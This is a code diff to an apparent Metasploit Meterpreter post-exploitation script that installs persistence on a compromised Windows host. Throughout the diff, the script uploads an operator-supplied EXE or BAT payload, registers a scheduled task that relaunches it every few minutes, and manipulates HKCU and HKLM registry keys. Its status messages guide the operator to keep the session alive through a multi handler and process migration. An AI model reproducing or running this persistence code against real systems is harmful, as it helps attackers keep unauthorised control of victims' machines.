@@ -20,14 +20,14 @@ name = "update-svc-msf"
 delay = 5
 unin = false
 ext = ".exe"
-cusexe = ""
+cusexe = nil
 
 @exec_opts = Rex::Parser::Arguments.new(
   "-h"  => [ true,  "This help menu"],
   "-x"  => [ true,   "The path to the Custom EXE or BAT file to use for persistence, e.g. -x /root/msf.exe"],
   "-d"  => [ true,   "The delay on the scheduled task in minutes"],
   "-n"  => [ true,   "The name of the task and registry key on the host"],
-  "-u"  => [ true,   "The interval in seconds between each connection attempt"]
+  "-u"  => [ true,   "To uninstall the persistence from the host"]
 )
 meter_type = client.platform
 
@@ -129,20 +129,18 @@ meter_type = client.platform
     print_status("Running module against " + @client.session_host)
     print("\n")
 
-    # If the uninstall flag is set, remove the persistence
     if unin == true
       print_status("Removing scheduled task from " + @client.session_host)
       run_cmd("schtasks /delete /f /tn #{name}")
       delete_reg("HKCU", name)
       delete_reg("HKLM", name)
+    end
 
-    else
+    if cusexe
       # uploads the payload to the host
       script_on_target = write_to_target(cusexe)
-
       # exit the module because we failed to write the file on the target host.
       return unless script_on_target
-
       # install new scheduled tasks (removes any previously installed tasks first) 
       run_cmd("schtasks /delete /f /tn #{name}")
       run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
@@ -154,4 +152,12 @@ meter_type = client.platform
       print("\n")
       print_status("Create your multi handler, your persistence will not re-run if you do not migrate the session and kill the original process, use 'migrate -f -k'")
       print_status("To remove persistence add the -u option")
+    else 
+      if unin == true
+      else
+        print_status("No payload set")
+      end
     end
+
+    # If the uninstall flag is set, remove the persistence
+
